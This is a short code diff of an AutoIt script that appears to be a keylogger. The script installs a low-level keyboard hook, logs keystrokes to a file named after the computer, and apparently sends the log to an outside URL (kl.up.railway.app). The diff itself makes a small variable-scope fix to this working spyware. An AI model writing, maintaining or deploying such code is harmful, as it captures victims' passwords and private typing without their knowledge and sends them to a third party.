@@ -11,7 +11,7 @@ Global $file, $f3 = 0
 Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
-
+Global $last_send = 0
 
  	_Main()
 
@@ -24,7 +24,7 @@ Func _Main()
     $hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
     
     Local $startTime = TimerInit()
-	local $last_send = TimerInit()
+	$last_send = TimerInit()
 	
 	send_file(true)
 	
